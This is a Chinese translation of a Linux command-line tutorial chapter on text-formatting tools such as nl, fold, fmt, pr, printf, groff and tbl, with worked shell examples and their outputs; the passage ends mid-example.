<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">sort</span> -k 1,1 -k 2n distros.txt | sed -f distros-nl.sed | <span class="built_in">nl</span></span><br><span class="line"></span><br><span class="line"> Linux 发行版报告</span><br><span class="line"></span><br><span class="line"> 名称 版本 发布日期</span><br><span class="line"> ---- ---- --------</span><br><span class="line"> 1 Fedora 5 2006-03-20</span><br><span class="line"> 2 Fedora 6 2006-10-24</span><br><span class="line"> 3 Fedora 7 2007-05-31</span><br><span class="line"> 4 Fedora 8 2007-11-08</span><br><span class="line"> 5 Fedora 9 2008-05-13</span><br><span class="line"> 6 Fedora 10 2008-11-25</span><br><span class="line"> 7 SUSE 10.1 2006-05-11</span><br><span class="line"> 8 SUSE 10.2 2006-12-07</span><br><span class="line"> 9 SUSE 10.3 2007-10-04</span><br><span class="line"> 10 SUSE 11.0 2008-06-19</span><br><span class="line"> 11 Ubuntu 6.06 2006-06-01</span><br><span class="line"> 12 Ubuntu 6.10 2006-10-26</span><br><span class="line"> 13 Ubuntu 7.04 2007-04-19</span><br><span class="line"> 14 Ubuntu 7.10 2007-10-18</span><br><span class="line"> 15 Ubuntu 8.04 2008-04-24</span><br><span class="line"> 16 Ubuntu 8.10 2008-10-30</span><br><span class="line"></span><br><span class="line"> 报告结束</span><br></pre></td></tr></table></figure>

<p>我们的报告是命令管道的结果。首先，我们按发行版名称和版本（字段 1 和 2）对列表进行排序，然后我们用 sed 处理结果，添加报告头部（包括逻辑页面标记以供 nl 使用）和尾部。最后，我们用 nl 处理结果，它默认只对文本流属于逻辑页面主体部分的行进行编号。</p>
<p>我们可以重复命令并尝试不同的 nl 选项。一些有趣的选项包括：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nl</span> -n rz</span><br></pre></td></tr></table></figure>

<p>以及以下选项：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nl</span> -w 3 -s <span class="string">&#x27; &#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="fold-将每行文本折叠到指定长度"><a href="#fold-将每行文本折叠到指定长度" class="headerlink" title="fold - 将每行文本折叠到指定长度"></a>fold - 将每行文本折叠到指定长度</h4><p><em>折叠</em> 是指在指定宽度处断开文本行的过程。和我们的其他命令一样，fold 接受一个或多个文本文件或标准输入。如果我们向 fold 发送一个简单的文本流，我们可以看到它是如何工作的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;The quick brown fox jumped over the lazy dog.&quot;</span> | <span class="built_in">fold</span> -w 12</span><br><span class="line">The quick br</span><br><span class="line">own fox jump</span><br><span class="line">ed over the</span><br><span class="line">lazy dog.</span><br></pre></td></tr></table></figure>

<p>在这里我们看到 fold 的作用。由 echo 命令发送的文本被分成由 -w 选项指定的段。在这个例子中，我们指定了一个宽度为 12 个字符的行宽。如果没有指定宽度，默认为 80 个字符。注意无论单词边界如何，行都会被断开。添加 -s 选项将导致 fold 在达到行宽之前的最后一个可用空间处断开行。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;The quick brown fox jumped over the lazy dog.&quot;</span> | <span class="built_in">fold</span> -w 12 -s</span><br><span class="line">The quick</span><br><span class="line">brown fox</span><br><span class="line">jumped over</span><br><span class="line">the lazy</span><br><span class="line">dog.</span><br></pre></td></tr></table></figure>

<h4 id="fmt-一个简单的文本格式化工具"><a href="#fmt-一个简单的文本格式化工具" class="headerlink" title="fmt - 一个简单的文本格式化工具"></a>fmt - 一个简单的文本格式化工具</h4><p>fmt 程序也会折叠文本，并且做得更多。它接受文件或标准输入，并对文本流执行段落格式化。基本上，它在保留空行和缩进的同时，填充和连接文本中的行。</p>
<p>为了演示，我们需要一些文本。让我们从 fmt 的信息页中提取一些内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> `<span class="built_in">fmt</span><span class="string">&#x27; 从指定的 FILE 参数（如果没有给出则从标准输入）读取，并写入到标准输出。</span></span><br><span class="line"><span class="string">默认情况下，空行、单词之间的空格和缩进在输出中被保留；不同缩进的连续输入行不会被连接；在输入时扩展制表符，在输出时引入制表符。</span></span><br><span class="line"><span class="string"> `fmt&#x27;</span> 更喜欢在句子的末尾断开行，并尝试避免在句子的第一个单词之后或最后一个单词之前断开行。<span class="string">&quot;句子断点&quot;</span>被定义为段落的末尾或以任何 `.?!<span class="string">&#x27; 结尾的单词，后跟两个空格或行尾，忽略任何介于两者之间的括号或引号。像 TeX 一样，`fmt&#x27;</span> 在选择断行前会读取整个<span class="string">&quot;段落&quot;</span>；该算法是 Donald E. Knuth 和 Michael F. Plass 在 <span class="string">&quot;Breaking Paragraphs Into Lines&quot;</span>，`Software--Practice &amp; Experience<span class="string">&#x27; 11, 11（1981 年 11 月），1119-1184 中给出的算法的一个变种。</span></span><br></pre></td></tr></table></figure>

<p>我们将把这段文本复制到文本编辑器中并将文件保存为 fmt-info.txt。现在，假设我们想要将这段文本重新格式化以适应 50 个字符宽的列。我们可以通过使用 fmt 和 -w 选项处理文件来实现。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">fmt</span> -w 50 fmt-info.txt | <span class="built_in">head</span></span><br><span class="line"> `<span class="built_in">fmt</span><span class="string">&#x27; 从指定的 FILE 参数读取</span></span><br><span class="line"><span class="string"> (或标准输入如果</span></span><br><span class="line"><span class="string">没有给出)，并写入标准输出。</span></span><br><span class="line"><span class="string">默认情况下，空行、单词之间的空格，</span></span><br><span class="line"><span class="string"> 和缩进在输出中被保留；不同缩进的连续输入行</span></span><br><span class="line"><span class="string">没有被连接；在输入时扩展制表符并在输出时引入。</span></span><br></pre></td></tr></table></figure>

<p>好吧，这是一个尴尬的结果。也许我们应该实际阅读这段文本，因为它解释了发生了什么。</p>
<blockquote>
<p><em>默认情况下，空行、单词之间的空格和缩进在输出中被保留；不同缩进的连续输入行不会被连接；在输入时扩展制表符，在输出时引入制表符。</em></p>
</blockquote>
<p>所以，fmt 保留了第一行的缩进。幸运的是，fmt 提供了一个选项来纠正这个问题。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">fmt</span> -cw 50 fmt-info.txt</span><br><span class="line"> `<span class="built_in">fmt</span><span class="string">&#x27; 从指定的 FILE 参数读取</span></span><br><span class="line"><span class="string">(或标准输入如果没有给出)，并写入</span></span><br><span class="line"><span class="string">到标准输出。</span></span><br><span class="line"><span class="string">默认情况下，空行、单词之间的空格，</span></span><br><span class="line"><span class="string">和缩进在输出中被保留；</span></span><br><span class="line"><span class="string">连续输入行的不同缩进没有被连接；</span></span><br><span class="line"><span class="string">在输入时扩展制表符并在输出时引入。</span></span><br><span class="line"><span class="string"> `fmt&#x27;</span> 更喜欢在句子的末尾断开行，</span><br><span class="line">并尝试避免在句子的第一个单词之后</span><br><span class="line">或最后一个单词之前断开行。<span class="string">&quot;句子断点&quot;</span></span><br><span class="line">被定义为段落的末尾</span><br><span class="line">或以任何 `.?!<span class="string">&#x27; 结尾的单词，后跟</span></span><br><span class="line"><span class="string">两个空格或行尾，忽略任何</span></span><br><span class="line"><span class="string">介于两者之间的括号或引号。像 TeX，</span></span><br><span class="line"><span class="string">`fmt&#x27;</span> 在选择断行前会读取整个<span class="string">&quot;段落&quot;</span>；</span><br><span class="line">该算法是 Donald E. Knuth 和 Michael F.</span><br><span class="line">Plass 在 <span class="string">&quot;Breaking Paragraphs Into Lines&quot;</span>,</span><br><span class="line">`Software--Practice &amp; Experience<span class="string">&#x27; 11, 11</span></span><br><span class="line"><span class="string">（1981 年 11 月），1119-1184 中给出的算法的一个变种。</span></span><br></pre></td></tr></table></figure>

<p>这样好多了。通过添加 -c 选项，我们现在得到了期望的结果。fmt 有一些有趣的选项，如表 21-3 所述。</p>
<p><em>表 21-3: fmt 选项</em></p>
<table>
<thead>
<tr>
<th><strong>选项</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-c</td>
<td>在 <em>冠边距</em> 模式下操作。这保留了段落前两行的缩进。后续行与第二行的缩进对齐。</td>
</tr>
<tr>
<td>-p <em>string</em></td>
<td>仅格式化以前缀 <em>string</em> 开始的行。格式化后，将 <em>string</em> 的内容前缀添加到每个重新格式化的行。这个选项可以用来格式化源代码注释中的文本。例如，任何使用 “#” 字符来界定注释的编程语言或配置文件都可以通过指定 -p ‘# ‘ 来格式化，以便只有注释会被格式化。见下面的例子。</td>
</tr>
<tr>
<td>-s</td>
<td>仅分割模式。在这种模式下，行将只被分割以适应指定的列宽。短行不会被连接以填充行。当格式化像代码这样的文本时，这种模式很有用，因为不希望进行连接。</td>
</tr>
<tr>
<td>-u</td>
<td>执行均匀间距。这将对文本应用传统的“打字机风格”格式化。这意味着单词之间一个空格，句子之间两个空格。这种模式用于移除“对齐”，即文本已被填充空格以强制在左右两边对齐。</td>
</tr>
<tr>
<td>-w <em>width</em></td>
<td>格式化文本以适应列宽 <em>width</em> 个字符宽。默认为 75 个字符。注意：fmt 实际上格式化的行稍微短于指定的宽度，以允许行平衡。</td>
</tr>
</tbody></table>
<p>-p 选项特别有趣。有了它，我们可以格式化文件的选定部分，前提是要格式化的行都以相同的字符序列开始。许多编程语言使用井号 (#) 来表示注释的开头，因此可以使用这个选项来格式化注释，并保留代码不变。让我们创建一个模拟使用注释的程序的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cat</span> &gt; fmt-code.txt</span><br><span class="line"><span class="comment"># 这个文件包含带注释的代码。</span></span><br><span class="line"><span class="comment"># 这是一行注释。</span></span><br><span class="line"><span class="comment"># 后面是另一行注释。</span></span><br><span class="line"><span class="comment"># 还有一行。</span></span><br><span class="line">这，另一方面，是一行代码。</span><br><span class="line">又一行代码。</span><br><span class="line">还有一行。</span><br></pre></td></tr></table></figure>

<p>我们的示例文件包含以字符串 “# ”（一个 # 后跟一个空格）开头的注释和不以指定前缀开头的“代码”行。现在，使用 fmt，我们可以格式化注释并保留代码不变。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">fmt</span> -w 50 -p <span class="string">&#x27;# &#x27;</span> fmt-code.txt</span><br><span class="line"><span class="comment"># 这个文件包含带注释的代码。</span></span><br><span class="line"><span class="comment"># 这是一行注释。后面是另一行</span></span><br><span class="line"><span class="comment"># 注释。还有一行。</span></span><br><span class="line">这，另一方面，是一行代码。</span><br><span class="line">又一行代码。</span><br><span class="line">还有一行。</span><br></pre></td></tr></table></figure>

<p>注意，相邻的注释行被连接，而空行和不以指定前缀开头的行被保留。</p>
<h4 id="pr-为打印格式化文本"><a href="#pr-为打印格式化文本" class="headerlink" title="pr - 为打印格式化文本"></a>pr - 为打印格式化文本</h4><p>pr 程序用于 <em>分页</em> 文本。打印文本时，通常希望用几行空白分隔输出的每一页，为每一页提供上边距和下边距。此外，这些空白可以用来在每一页上插入页眉和页脚。</p>
<p>我们将通过将我们的 distros.txt 文件格式化为一系列短页来演示 pr（仅显示前两页）。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">pr</span> -l 15 -w 65 distros.txt</span><br><span class="line">2016-12-11 18:27 distros.txt 第 1 页</span><br><span class="line">SUSE 10.2 12/07/2006</span><br><span class="line">Fedora 10 11/25/2008</span><br><span class="line">SUSE 11.0 06/19/2008</span><br><span class="line">Ubuntu 8.04 04/24/2008</span><br><span class="line">Fedora 8 11/08/2007</span><br><span class="line">2016-12-11 18:27 distros.txt 第 2 页</span><br><span class="line">SUSE 10.3 10/04/2007</span><br><span class="line">Ubuntu 6.10 10/26/2006</span><br><span class="line">Fedora 7 05/31/2007</span><br><span class="line">Ubuntu 7.10 10/18/2007</span><br><span class="line">Ubuntu 7.04 04/19/2007</span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们使用 -l 选项（页长）和 -w 选项（页宽）来定义一个“页面”，它的宽度为 65 列，长度为 15 行。pr 将 distros.txt 文件的内容分页，用几行空白分隔每一页，并创建一个包含文件修改时间、文件名和页码的默认页眉。pr 程序提供了许多选项来控制页面布局。我们将在第 22 章，“打印”中再看看它们。</p>
<h4 id="printf-格式化并打印数据"><a href="#printf-格式化并打印数据" class="headerlink" title="printf - 格式化并打印数据"></a>printf - 格式化并打印数据</h4><p>与本章中的其他命令不同，printf命令不用于管道（它不接受标准输入），也不常直接在命令行中使用（它主要用于脚本中）。那为什么它还重要呢？因为它的使用非常广泛。</p>
<p>printf（来自“打印格式化”这个短语）最初是为C编程语言开发的，并已在包括shell在内的许多编程语言中实现。实际上，在bash中，printf是一个内建命令。printf的工作方式如下：</p>
<p>printf “<em>格式</em>” <em>参数</em></p>
<p>该命令被给予一个包含格式描述的字符串，然后将其应用于参数列表。格式化的结果发送到标准输出。这是一个简单的例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">printf</span> <span class="string">&quot;我格式化了字符串：%s\n&quot;</span> foo</span><br><span class="line">我格式化了字符串：foo</span><br></pre></td></tr></table></figure>

<p>格式字符串可能包含字面文本（如“我格式化了字符串：”）、转义序列（如\n，一个换行字符）和以%字符开头的序列，这些序列称为<em>转换说明符</em>。在上面的例子中，转换说明符%s用于格式化字符串“foo”并将其放置在命令的输出中。这里再次展示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">printf</span> <span class="string">&quot;我将&#x27;%s&#x27;格式化为字符串。\n&quot;</span> foo</span><br><span class="line">我将<span class="string">&#x27;foo&#x27;</span>格式化为字符串。</span><br></pre></td></tr></table></figure>

<p>正如我们所见，%s转换说明符被替换为命令输出中的字符串“foo”。s转换用于格式化字符串数据。其他说明符用于其他种类的数据。表21-4列出了常用的数据类型说明符。</p>
<p><em>表21-4：常见的printf数据类型说明符</em></p>
<table>
<thead>
<tr>
<th><strong>说明符</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>d</td>
<td>将数字格式化为有符号十进制整数。</td>
</tr>
<tr>
<td>f</td>
<td>格式化并输出一个浮点数。</td>
</tr>
<tr>
<td>o</td>
<td>将整数格式化为八进制数。</td>
</tr>
<tr>
<td>s</td>
<td>格式化字符串。</td>
</tr>
<tr>
<td>x</td>
<td>将整数格式化为十六进制数，需要时使用小写字母a到f。</td>
</tr>
<tr>
<td>X</td>
<td>与x相同，但使用大写字母。</td>
</tr>
<tr>
<td>%</td>
<td>打印一个字面%符号（即，指定%%）</td>
</tr>
</tbody></table>
<p>我们将演示每个转换说明符对字符串380的效果。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">printf</span> <span class="string">&quot;%d, %f, %o, %s, %x, %X\n&quot;</span> 380 380 380 380</span><br><span class="line">380, 380.000000, 574, 380, 17c, 17C</span><br></pre></td></tr></table></figure>

<p>由于我们指定了六个转换说明符，我们也必须为printf提供六个参数来处理。六个结果显示了每个说明符的效果。</p>
<p>可以向转换说明符添加几个可选组件来调整其输出。一个完整的转换说明符可能包含以下内容：</p>
<blockquote>
<p>%[flags][width][.precision]conversion_specification</p>
</blockquote>
<p>使用时，多个可选组件必须按照早先指定的顺序出现，以便正确解释。表21-5描述了每个组件。</p>
<p><em>表21-5：printf转换说明符组件</em></p>
<table>
<thead>
<tr>
<th><strong>组件</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><em>flags</em></td>
<td>有五种不同的标志：</td>
</tr>
<tr>
<td></td>
<td># : 使用“备选格式”进行输出。这根据数据类型而有所不同。对于o（八进制数）转换，输出前缀为0。对于x和X（十六进制数）转换，输出前缀分别为0x或0X。</td>
</tr>
<tr>
<td></td>
<td>0（零）: 用零填充输出。这意味着字段将用前导零填充，如000380。</td>
</tr>
<tr>
<td></td>
<td>-（破折号）: 左对齐输出。默认情况下，printf右对齐输出。</td>
</tr>
<tr>
<td></td>
<td>‘ ’（空格）: 为正数生成一个前导空格。</td>
</tr>
<tr>
<td></td>
<td>+（加号）: 标记正数。默认情况下，printf只标记负数。</td>
</tr>
<tr>
<td><em>width</em></td>
<td>指定最小字段宽度的数字。</td>
</tr>
<tr>
<td><em>.precision</em></td>
<td>对于浮点数，指定小数点后要输出的精度位数。对于字符串转换，<em>精度</em>指定要输出的字符数。</td>
</tr>
</tbody></table>
<p>表21-6列出了不同格式的一些例子。</p>
<p><em>表21-6：printf转换说明符示例</em></p>
<table>
<thead>
<tr>
<th><strong>参数</strong></th>
<th><strong>格式</strong></th>
<th><strong>结果</strong></th>
<th><strong>备注</strong></th>
</tr>
</thead>
<tbody><tr>
<td>380</td>
<td>“%d”</td>
<td>380</td>
<td>整数的简单格式化。</td>
</tr>
<tr>
<td>380</td>
<td>“%#x”</td>
<td>0x17c</td>
<td>使用“备选格式”标志格式化为十六进制数的整数。</td>
</tr>
<tr>
<td>380</td>
<td>“%05d”</td>
<td>00380</td>
<td>用前导零（填充）和最小字段宽度为五个字符格式化的整数。</td>
</tr>
<tr>
<td>380</td>
<td>“%05.5f”</td>
<td>380.00000</td>
<td>将数字格式化为带有填充和五位小数精度的浮点数。由于指定的最小字段宽度（5）小于格式化数字的实际宽度，填充无效。</td>
</tr>
<tr>
<td>380</td>
<td>“%010.5f”</td>
<td>0380.00000</td>
<td>将最小字段宽度增加到10，现在可以看到填充效果。</td>
</tr>
<tr>
<td>380</td>
<td>“%+d”</td>
<td>+380</td>
<td>+标志为正数加上符号。</td>
</tr>
<tr>
<td>380</td>
<td>“%-d”</td>
<td>380</td>
<td>-标志左对齐格式化。</td>
</tr>
<tr>
<td>abcdefghijk</td>
<td>“%5s”</td>
<td>abcedfghijk</td>
<td>使用最小字段宽度格式化的字符串。</td>
</tr>
<tr>
<td>abcdefghijk</td>
<td>“%.5s”</td>
<td>abcde</td>
<td>通过对字符串应用精度，它被截断。</td>
</tr>
</tbody></table>
<p>再次强调，printf主要用于脚本中，其中它被用来格式化表格数据，而不是直接在命令行上使用。但我们仍然可以展示如何使用它来解决各种格式化问题。首先，让我们输出一些由制表符分隔的字段。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">printf</span> <span class="string">&quot;%s\t%s\t%s\n&quot;</span> str1 str2 str3</span><br><span class="line">str1    str2    str3</span><br></pre></td></tr></table></figure>

<p>通过插入\t（制表符的转义序列），我们实现了预期的效果。接下来，这里有一些整齐格式化的数字：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">printf</span> <span class="string">&quot;行号：%05d %15.3f 结果：%+15d\n&quot;</span> 1071 3.14156295 32589</span><br><span class="line">行号：01071           3.142 结果：         +32589</span><br></pre></td></tr></table></figure>

<p>这显示了最小字段宽度对字段间距的影响。或者我们如何格式化一个小型网页？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">printf</span> <span class="string">&quot;&lt;html&gt;\n\t&lt;head&gt;\n\t\t&lt;title&gt;%s&lt;/title&gt;\n\t&lt;/head&gt;\n\t&lt;body&gt;\n\t\t&lt;p&gt;%s&lt;/p&gt;\n\t&lt;/body&gt;\n&lt;/html&gt;\n&quot;</span> <span class="string">&quot;页面标题&quot;</span> <span class="string">&quot;页面内容&quot;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">&lt;title&gt;页面标题&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;页面内容&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="文档格式化系统"><a href="#文档格式化系统" class="headerlink" title="文档格式化系统"></a>文档格式化系统</h3><p>到目前为止，我们已经检查了简单的文本格式化工具。这些工具对于小型、简单的任务来说是好的，但对于更大的任务呢？Unix成为技术和科学用户（除了提供一个强大的多任务、多用户环境用于各种软件开发之外）喜爱的操作系统的原因之一是，它提供了可以用来制作多种类型文档的工具，特别是科学和学术出版物。实际上，正如GNU文档所描述的，文档准备对于Unix的开发起到了关键作用。</p>
<p><em>UNIX的第一个版本是在一个闲置的PDP-7上开发的。1971年，开发者们希望获得一台PDP-11来继续操作系统的开发。为了证明这个系统的成本，他们提出了为AT&amp;T专利部门实现一个文档格式化系统的计划。这个第一个格式化程序是J. F. Ossanna重写的McIllroy的<code>roff</code>。</em></p>
<p>两大主要的文档格式化系统占据了主导地位：那些源自原始的roff程序，包括nroff和troff，以及基于Donald Knuth的TEX（发音为“tek”）排版系统的那些。是的，中间掉落的“E”是它的名字的一部分。</p>
<p>“roff”的名字来源于“run off”，就像是，“我会给你复制一份。”nroff程序用于为使用等宽字体的设备格式化文档，如字符终端和打字机风格的打印机。在其引入时，这几乎包括了连接到计算机的所有打印设备。后来的troff程序格式化文档以便在<em>排版机</em>上输出，排版机是用于为商业印刷生产“相机就绪”类型的设备。今天的大多数计算机打印机能够模拟排版机的输出。roff家族还包括一些其他用于准备文档部分的程序。这些包括eqn（用于数学方程）和tbl（用于表格）。</p>
<p>TEX系统（在稳定形态下）首次出现在1989年，并在某种程度上取代了troff，成为排版输出工具的首选。我们不会在这里详细介绍TEX，部分是因为它的复杂性（有关它的整本书），部分是因为它并非默认安装在大多数现代Linux系统上。</p>
<p><strong>提示：</strong> 对于那些有兴趣安装TEX的人，请查看大多数发行版仓库中的texlive包，以及LyX图形内容编辑器。</p>
<h4 id="groff"><a href="#groff" class="headerlink" title="groff"></a>groff</h4><p>groff是一套包含GNU实现的troff的程序。它还包括一个脚本，用于模拟nroff和其他roff家族成员。</p>
<p>虽然roff及其后代用于制作格式化文档，但它们的方式对于现代用户来说相当陌生。今天，大多数文档是使用能够在单一步骤中执行文档的组合和布局的文字处理器产生的。在图形文字处理器出现之前，文档通常是通过使用文本编辑器进行组合和使用诸如troff之类的处理器应用格式化的两步过程产生的。通过使用标记语言将格式化程序的指令嵌入到组成的文本中。这样的过程的现代类比是网页，使用某种文本编辑器进行组合，然后使用HTML作为标记语言由Web浏览器渲染以描述最终页面布局。</p>
<p>我们不打算完整地介绍groff，因为其标记语言的许多元素涉及排版的相当古老的细节。相反，我们将集中讨论其<em>宏包</em>之一，这仍然广泛使用。这些宏包将其许多低级命令压缩成一小组高级命令，使得使用groff变得更加容易。</p>
<p>让我们暂时考虑一下谦逊的man页面。它存在于&#x2F;usr&#x2F;share&#x2F;man目录中，作为gzip压缩的文本文件。如果我们查看其解压缩内容，我们会看到以下内容（展示的是第1节的ls的man页面）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ zcat /usr/share/man/man1/ls.1.gz | <span class="built_in">head</span></span><br><span class="line">.\&quot; 不要修改这个文件！它是由help2man 1.47.3生成的。</span><br><span class="line">.TH LS <span class="string">&quot;1&quot;</span> <span class="string">&quot;2018年1月&quot;</span> <span class="string">&quot;GNU coreutils 8.28&quot;</span> <span class="string">&quot;用户命令&quot;</span></span><br><span class="line">.SH 名称</span><br><span class="line"><span class="built_in">ls</span> \- 列出目录内容</span><br><span class="line">.SH 摘要</span><br><span class="line">.B <span class="built_in">ls</span></span><br><span class="line">[\fI\,选项\/\fR]... [\fI\,文件\/\fR]...</span><br><span class="line">.SH 描述</span><br><span class="line">.\&quot; 在这里添加任何额外的描述</span><br><span class="line">.PP</span><br></pre></td></tr></table></figure>

<p>与正常呈现的man页面相比，我们可以开始看到标记语言与其结果之间的相关性。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ man <span class="built_in">ls</span> | <span class="built_in">head</span></span><br><span class="line">LS(1) 用户命令 LS(1)</span><br><span class="line">名称</span><br><span class="line"> <span class="built_in">ls</span> - 列出目录内容</span><br><span class="line">摘要</span><br><span class="line"> <span class="built_in">ls</span> [选项]... [文件]...</span><br></pre></td></tr></table></figure>

<p>之所以感兴趣，是因为man页面是由groff渲染的，使用的是mandoc宏包。实际上，我们可以用以下管道模拟man命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ zcat /usr/share/man/man1/ls.1.gz | groff -mandoc -T ascii | <span class="built_in">head</span></span><br><span class="line">LS(1) 用户命令 LS(1)</span><br><span class="line">名称</span><br><span class="line"> <span class="built_in">ls</span> - 列出目录内容</span><br><span class="line">摘要</span><br><span class="line"> <span class="built_in">ls</span> [选项]... [文件]...</span><br></pre></td></tr></table></figure>

<p>在这里，我们使用groff程序，并设置选项以指定mandoc宏包和ASCII输出驱动程序。groff可以产生多种格式的输出。如果没有指定格式，默认输出为PostScript。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ zcat /usr/share/man/man1/ls.1.gz | groff -mandoc | <span class="built_in">head</span></span><br><span class="line">%!PS-Adobe-3.0</span><br><span class="line">%%Creator: groff version 1.18.1</span><br><span class="line">%%CreationDate: 2009年2月5日 13:44:37</span><br><span class="line">%%DocumentNeededResources: font Times-Roman</span><br><span class="line">%%+ font Times-Bold</span><br><span class="line">%%+ font Times-Italic</span><br><span class="line">%%DocumentSuppliedResources: procset grops 1.18 1</span><br><span class="line">%%Pages: 4</span><br><span class="line">%%PageOrder: Ascend</span><br><span class="line">%%Orientation: Portrait</span><br></pre></td></tr></table></figure>

<p>我们在前一章中简要提到了PostScript，并将在下一章中再次提到。PostScript是一种页面描述语言，用于向类似排版机的设备描述打印页面的内容。如果我们将命令的输出存储到文件中（假设我们正在使用带有桌面目录的图形桌面），则输出文件的图标应该会出现在桌面上。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ zcat /usr/share/man/man1/ls.1.gz | groff -mandoc &gt; ~/Desktop/ls.ps</span><br></pre></td></tr></table></figure>

<p>通过双击图标，应该会启动一个页面查看器，并显示文件的渲染形式，如图5所示。</p>
<p><img src="/images/2024/Picture5.png"></p>
<p><em>图5：在GNOME中使用页面查看器查看PostScript输出</em></p>
<p>我们看到的是一个精美的排版man页面！事实上，可以使用以下命令将PostScript文件转换为<em>便携式文档格式</em>（PDF）文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ps2pdf ~/Desktop/foo.ps ~/Desktop/ls.pdf</span><br></pre></td></tr></table></figure>

<p>ps2pdf程序是ghostscript包的一部分，该包安装在大多数支持打印的Linux系统上。</p>
<p><strong>提示</strong>：Linux系统通常包括许多命令行程序用于文件格式转换。它们通常使用<em>格式</em>2<em>格式</em>的命名约定。尝试使用命令ls &#x2F;usr&#x2F;bin&#x2F;*[[:alpha:]]2[[:alpha:]]*来识别它们。</p>
<p>也尝试搜索名为<em>格式</em><strong>to</strong><em>格式</em>的程序。</p>
<p>对于我们最后一次使用groff的练习，我们将重新访问我们的老朋友distros.txt。这次，我们将使用tbl程序，它用于格式化表格，以排版我们的Linux发行版列表。为此，我们将使用我们早期的sed脚本向文本流添加标记（称为<em>请求</em>），然后将其提供给groff。</p>
<p>首先，我们需要修改我们的sed脚本以添加tbl所需的必要标记元素（请求）。使用文本编辑器，我们将distros.sed更改为以下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sed脚本生成Linux发行版报告</span></span><br><span class="line">1 i\</span><br><span class="line">.TS\</span><br><span class="line">center box;\</span><br><span class="line">cb s s\</span><br><span class="line">cb cb cb\</span><br><span class="line">l n c.\</span><br><span class="line">Linux发行版报告\</span><br><span class="line">=\</span><br><span class="line">名称 版本 发布\</span><br><span class="line">_</span><br><span class="line">s/\([0-9]\&#123;2\&#125;\)\/\([0-9]\&#123;2\&#125;\)\/\([0-9]\&#123;4\&#125;\)$/\3-\1-\2/</span><br><span class="line">$ a\</span><br><span class="line">.TE</span><br></pre></td></tr></table></figure>

<p>注意，为了使脚本正常工作，务必确保名称版本发布之间用制表符而不是空格分隔。我们将结果文件保存为distros-tbl.sed。tbl使用.TS和.TE请求来开始和结束表格。.TS请求之后的行定义表格的全局属性，对于我们的示例，是水平居中于页面并且周围有一个盒子。定义的剩余行描述了每个表格行的布局。现在，如果我们再次运行我们的报告生成管道，并使用新的sed脚本，我们将得到以下结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">sort</span> -k 1,1 -k 2n distros.txt | sed -f distros-tbl.sed | groff -t -T ascii</span><br><span class="line"> +------------------------------+</span><br><span class="line"> | Linux发行版报告 |</span><br><span class="line"> +------------------------------+</span><br><span class="line"> | 名称 版本 发布 |</span><br><span class="line"> +------------------------------+</span><br><span class="line"> |Fedora 5 2006-03-20 |</span><br><span class="line"> |Fedora 6 2006-10-24 |</span><br><span class="line"> |Fedora 7 2007-05-31 |</span><br><span class="line"> |Fedora 8 2007-11-08 |</span><br><span class="line"> |Fedora 9 2008-05-13 |</span><br><span class="line"> |Fedora 10 2008-11-25 |</span><br><span class="line"> |SUSE 10.1 2006-05-11 |</span><br><span class="line"> |SUSE 10.2 2006-12-07 |</span><br><span class="line"> |SUSE 10.3 2007-10-04 |</span><br><span class="line"> |SUSE 11.0 2008-06-19 |</span><br><span class="line"> |Ubuntu 6.06 2006-06-01 |</span><br><span class="line"> |Ubuntu 6.10 2006-10-26 |</span><br><span class="line"> |Ubuntu 